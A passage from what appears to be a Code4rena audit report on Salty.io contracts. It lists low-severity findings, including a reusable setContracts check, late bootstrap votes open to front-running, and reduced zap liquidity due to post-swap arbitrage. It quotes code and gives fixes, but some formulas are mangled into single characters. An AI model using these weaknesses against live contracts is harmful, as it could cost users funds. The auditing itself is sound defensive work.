But when dao is the zero address, it can bypass the check.
https://github.com/code-423n4/2024-01-salty/blob/main/src/ExchangeConfig.sol#L51
```
require( address(dao) == address(0), "setContracts can only be called once" );
```
The owner can set the address of many parameters multiple times.
Describe some of the impacts here.

- The airdrop address is expected to be set only once.
When the airdrop address can be reset.
This will affect functions that use the return value of walletHasAccess() to verify legitimacy, including [CollateralAndLiquidity.sol borrowUSDS()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L95), [Liquidity.sol _depositLiquidityAndIncreaseShare()](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Liquidity.sol#L83), and [Staking.sol stakeSALT()](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/Staking.sol#L41).

- The upkeep address is expected to be set only once.
When the upkeep address can be reset.
can use [withdrawArbitrageProfits() from DAO.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L295) to withdraw the WETH arbitrage profits.
It also affects all functions that check permissions using ```msg.sender == address(exchangeConfig.upkeep)```.

## [L-05]The vote is ineffective.
Votes can still be cast after the completionTimestamp.

https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/BootstrapBallot.sol#L48
```
// Cast a YES or NO vote to start up the exchange, distribute SALT and establish initial geo restrictions.
	// Votes cannot be changed once they are cast.
	// Requires a valid signature to signify that the msg.sender is authorized to vote (being whitelisted and the retweeting exchange launch posting - checked offchain)
	function vote( bool voteStartExchangeYes, bytes calldata signature ) external nonReentrant
		{
		require( ! hasVoted[msg.sender], "User already voted" );

		// Verify the signature to confirm the user is authorized to vote
		bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, msg.sender));
		require(SigningTools._verifySignature(messageHash, signature), "Incorrect BootstrapBallot.vote signatory" );

		if ( voteStartExchangeYes )
			startExchangeYes++;
		else
			startExchangeNo++;

		hasVoted[msg.sender] = true;

		// As the whitelisted user has retweeted the launch message and voted, they are authorized to the receive the airdrop.
		airdrop.authorizeWallet(msg.sender);
		}
```

finalizeBallot allows anyone to call.
And finalizeBallot can be called immediately once completionTimestamp is reached.
Users can observe the voting process and immediately front-run favorable outcomes for themselves once the completionTimestamp is reached.
Votes cast by users after this point will be ineffective.
This could impact credibility.



## [L-06]  Redundant Function countryIsExcluded

The function countryIsExcluded only returns the excludedCountries[country], however, since this info could be retrieved directly from excludedCountries(country) as excludedCountries is public. The function defined here is redundant. The same works for Proposals::ballotForID, Proposals::lastUserVoteForBallot and Proposals::votesCastForBallot.

Linked Code: https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L384-L388


## [L-07]  When adding liquidity with useZapping = true, due to automatic atomic arbitrage（AAA）after swap, the liquidity obtained by the user will be less than the liquidity deserved

## Vulnerability details
After swap in depositSwapWithdraw()，it will call _attemptArbitrage() function to get profit from triangular arbitrage , and it will change pair token reserves of pool.For example, if user swaps token0 for token1 and it has arbitrage chance ,it will cause 
r
e
s
e
r
v
e
0
≠
r
e
s
e
r
v
e
0
+
a
m
o
u
n
t
0
I
n
 and 
r
e
s
e
r
v
e
1
≠
r
e
s
e
r
v
e
1
−
a
m
o
u
n
t
1
I
n
 afterdepositSwapWithdraw().But In _dualZapInLiquidity()function used in depositLiquidityAndIncreaseShare() and depositCollateralAndIncreaseShare() when useZapping = true, it assume 
r
e
s
e
r
v
e
0
=
r
e
s
e
r
v
e
0
+
a
m
o
u
n
t
0
I
n
 and 
r
e
s
e
r
v
e
1
=
r
e
s
e
r
v
e
1
−
a
m
o
u
n
t
1
I
n
 after depositSwapWithdraw(),and calculate amountIn to swap(_zapSwapAmount() in poolMath.sol).It will cause a discrepancy between the ratio of the pair tokens amount injected into pool and the pair tokens reserves in the pool，and causes users‘ liquidity less than the liquidity deserved in depositLiquidityAndIncreaseShare() and depositCollateralAndIncreaseShare() with useZapping = ture.
### Impact
Users will get less liquidity when calling depositLiquidityAndIncreaseShare() and depositCollateralAndIncreaseShare() with useZapping = ture.


### Proof of Concept

_zapSwapAmount() function in PoolMath.sol will calculate s0 amount as swap aomountIn,and it want the ratio of the pair tokens amount injected into pool equal to the pair tokens reserves in the pool after swap,the math detail in code:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolMath.sol#L9-L111

and they use this assumption equation：
$$
(z0 - s0) / ( z1 + s1) = (r0 + s0) / ( r1 - s1)
$$
z0/z1 is pair tokens amount which user provide to add，r0/r1 is reserves of pool before swap, s0 is swap amount in, s1 is swap amount out.

in this euqation, it assmue reserve0 =  (r0 + s0),reserve1 = ( r1 - s1)  after swap and before adding liquidity .

In fact, It does equal this value after swap , but it calls depositSwapWithdraw() in _dualZapInLiquidity() to swap:

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Liquidity.sol#L56-L73
```
		if ( swapAmountA > 0)
			{
			tokenA.approve( address(pools), swapAmountA );

			// Swap from tokenA to tokenB and adjust the zapAmounts
			zapAmountA -= swapAmountA;
			zapAmountB += pools.depositSwapWithdraw( tokenA, tokenB, swapAmountA, 0, block.timestamp );
			}

		// tokenB is in excess so swap some of it to tokenA?
		else if ( swapAmountB > 0)
			{
			tokenB.approve( address(pools), swapAmountB );

			// Swap from tokenB to tokenA and adjust the zapAmounts
			zapAmountB -= swapAmountB;
			zapAmountA += pools.depositSwapWithdraw( tokenB, tokenA, swapAmountB, 0, block.timestamp );
			}
```
it will try to triangular arbitrage(_attemptArbitrage()) after swap in _adjustReservesForSwapAndAttemptArbitrage()：

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L387

https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L356

```
		function _adjustReservesForSwapAndAttemptArbitrage( IERC20 swapTokenIn, IERC20 swapTokenOut, uint256 swapAmountIn, uint256 minAmountOut ) internal returns (uint256 swapAmountOut)
		{
		// Place the user swap first
		swapAmountOut = _adjustReservesForSwap( swapTokenIn, swapTokenOut, swapAmountIn );

		// Make sure the swap meets the minimums specified by the user
		require( swapAmountOut >= minAmountOut, "Insufficient resulting token amount" );

		// The user's swap has just been made - attempt atomic arbitrage to rebalance the pool and yield arbitrage profit
		uint256 arbitrageProfit = _attemptArbitrage( swapTokenIn, swapTokenOut, swapAmountIn );

		emit SwapAndArbitrage(msg.sender, swapTokenIn, swapTokenOut, swapAmountIn, swapAmountOut, arbitrageProfit);
		}
```
that will make reserve0 ≠ (r0 + s0),reserve1 ≠ ( r1 - s1)  before adding liquidity.So there is a discrepancy between the ratio of the pair tokens amount injected into pool and the pair tokens reserves in the pool，and causes users‘ liquidity less than the liquidity deserved in depositLiquidityAndIncreaseShare() and depositCollateralAndIncreaseShare() with useZapping = ture.

## Recommended Mitigation Steps
add and use a funtion like depositSwapWithdraw() but don't have AAA process and use it in _dualZapInLiquidity().